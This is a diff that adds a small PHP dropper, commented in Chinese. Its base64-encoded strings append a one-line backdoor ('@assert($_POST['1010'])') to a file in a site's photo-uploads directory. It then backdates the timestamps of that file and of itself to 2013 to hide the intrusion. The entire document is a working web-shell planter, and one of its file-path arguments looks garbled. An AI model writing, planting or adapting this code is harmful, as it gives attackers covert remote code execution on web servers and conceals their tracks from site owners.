@@ -1,0 +1,17 @@
+<?php
+        ob_start();
+        /*要写的路径*/
+        $fp=fopen(base64_decode('c3RhdGljc1x1cGxvYWRzXHBob3RvXDIwMTcwMTA0XHRlc3QucGhw='),'a+');
+        /////shell有多长就向前移动多长
+        fseek($fp,-32,SEEK_END);
+        //*编码后的shell，密码1010*/
+        if(base64_encode(fgets($fp))=="PD9waHAgQGFzc2VydCgkX1BPU1RbJzEwMTAnXSk7Pz4="){exit;};
+        //为什么和上面不一样，这里加了换行...
+    @fputs($fp,base64_decode('DQo8P3BocCBAYXNzZXJ0KCRfUE9TVFsnMTAxMCddKTs/Pg==')); 
+        //修改shell访问和修改时间
+        touch(base64_decode('c3RhdGljc1x1cGxvYWRzXHBob3RvXDIwMTcwMTA0XHRlc3QucGhw='),mktime(19,5,10,10,26,2013));
+        fclose($fp);
+        //修改当前文件的访问和修改时间
+        touch(base64_decode('UTF-8'),mktime(19,5,10,10,26,2013));
+    ob_end_clean();
+        ?>
